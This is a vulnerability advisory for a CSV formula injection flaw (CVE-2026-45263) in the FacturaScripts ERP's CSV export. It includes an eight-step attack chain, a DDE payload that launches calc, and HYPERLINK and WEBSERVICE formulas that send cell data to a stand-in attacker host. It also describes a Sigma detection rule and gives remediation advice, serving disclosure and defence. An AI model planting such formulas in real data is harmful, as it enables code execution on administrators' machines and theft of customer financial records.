---
title: FacturaScripts CSV Formula Injection via CSVExport Leads to RCE
slug: 2026-07-facturascripts-csv-injection
description: FacturaScripts is vulnerable to CVE-2026-45263, a CSV formula injection vulnerability due to improper sanitization of user-supplied input when exporting data to CSV files, allowing a low-privilege authenticated user to embed formula-triggering characters in text fields that execute when an administrator opens the exported CSV with spreadsheet software, potentially leading to code execution on the admin's workstation via DDE or macro invocation and credential theft.
date: "2026-07-14T19:23:19Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - csv-injection
  - web-application
  - rce
  - credential-theft
  - facturascripts
vendors:
  - FacturaScripts
products:
  - FacturaScripts (<= 2026.1)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1202
    technique_name: Indirect Command Execution
    evidence: Excel and LibreOffice will execute the formula on open, including DDE invocations such as `=cmd|'/c calc'!A1` that spawn arbitrary processes on the admin workstation.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: Excel and LibreOffice will execute the formula on open, including DDE invocations such as `=cmd|'/c calc'!A1` that spawn arbitrary processes on the admin workstation.
    confidence_band: high
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1552
    technique_name: Unsecured Credentials
    evidence: Common variants (`=HYPERLINK("https://attacker/?p=" & A1, "Click")`, `=WEBSERVICE("https://attacker/?p=" & A1)`) exfiltrate adjacent cell values (customer names, fiscal IDs, balances) when the admin clicks the cell.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-2p5x-4jr6-x5jg
iocs:
  - type: other
    value: =SUM(1+1)*cmd|/c calc!A1
  - type: other
    value: =HYPERLINK("https://attacker/?p=" & A1, "Click")
  - type: other
    value: =WEBSERVICE("https://attacker/?p=" & A1)
ioc_counts:
  other: 3
rules:
  - title: Detect Potential CSV Injection Code Execution from Spreadsheet Applications
    description: Detects suspicious process creation (e.g., cmd.exe, powershell.exe) directly launched by spreadsheet applications (Excel, LibreOffice Calc) which could indicate successful CSV formula injection exploitation, as described in CVE-2026-45263.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059
      - T1202
    data_sources:
      - process_creation
      - windows
rules_count: 1
---

A critical CSV formula injection vulnerability, identified as CVE-2026-45263, affects FacturaScripts, an open-source accounting and ERP system, specifically in versions up to 2026.1. This flaw allows low-privilege authenticated users to plant malicious spreadsheet formulas into various text fields, such as customer names, without proper sanitization. The core issue lies in `Core/Lib/Export/CSVExport.php::writeData()`, which fails to neutralize formula-triggering characters (like `=`, `+`, `-`, `@`) when exporting data to CSV. When an administrator, as part of their routine workflow, exports data containing these payloads and opens the resulting CSV file in spreadsheet software like Microsoft Excel or LibreOffice Calc, the embedded formulas are automatically executed. This can lead to severe consequences, including arbitrary code execution on the administrator's workstation via Dynamic Data Exchange (DDE) or macro invocation, and credential theft, enabling a complete host takeover. A Proof of Concept verified in April 2026 demonstrated the execution of `cmd /c calc` on an admin machine.

## Attack Chain

1. A low-privilege authenticated user logs into the FacturaScripts application.
2. The user navigates to a data entry form (e.g., `EditCliente`) and injects a malicious formula, such as `=SUM(1+1)*cmd|/c calc!A1`, into a text field (e.g., `nombre`).
3. FacturaScripts stores the input verbatim in the database because the `Tools::noHtml()` sanitization function (located at `Core/Tools.php:45`) only strips HTML metacharacters and not formula-triggering characters.
4. An administrator, performing routine tasks, initiates a CSV export of the affected data (e.g., `ListCliente` via `?action=export&option=CSV`).
5. The `CSVExport::writeData()` function in FacturaScripts exports the malicious formula unescaped into the generated CSV file.
6. The administrator's web browser downloads the CSV file (e.g., `export.csv`) to their local machine.
7. The administrator opens the downloaded CSV file using a spreadsheet application (e.g., Microsoft Excel or LibreOffice Calc) on their workstation.
8. The spreadsheet application interprets and executes the embedded formula, leading to arbitrary code execution (e.g., `calc.exe` via DDE) or credential theft on the administrator's workstation.

## Impact

Successful exploitation of this vulnerability leads to severe consequences for organizations using FacturaScripts. Attackers can achieve arbitrary code execution on administrator workstations, effectively gaining a beachhead for further compromise and potentially full host takeover. This direct access can facilitate credential theft, exfiltrating sensitive information such as customer names, fiscal IDs, and financial balances, especially through common variants like `=HYPERLINK` or `=WEBSERVICE` payloads. The attack leverages the trusted context of a downloaded internal ERP report, bypassing standard security hygiene that would otherwise flag untrusted spreadsheets. Any organization utilizing FacturaScripts, particularly those where low-privilege users can modify records and administrators regularly export data, is at risk.

## Recommendation

* Patch CVE-2026-45263 immediately by updating FacturaScripts to a version where the vulnerability is resolved or by applying the recommended code fix provided in the GitHub advisory.
* Deploy the provided Sigma rule to detect suspicious process creation activities originating from spreadsheet applications, which could indicate successful CSV formula injection exploitation.
* Enable comprehensive `process_creation` logging on all endpoint detection and response (EDR) agents to capture the `ParentImage` and `Image` fields for all executed processes, which is crucial for activating the rule above.
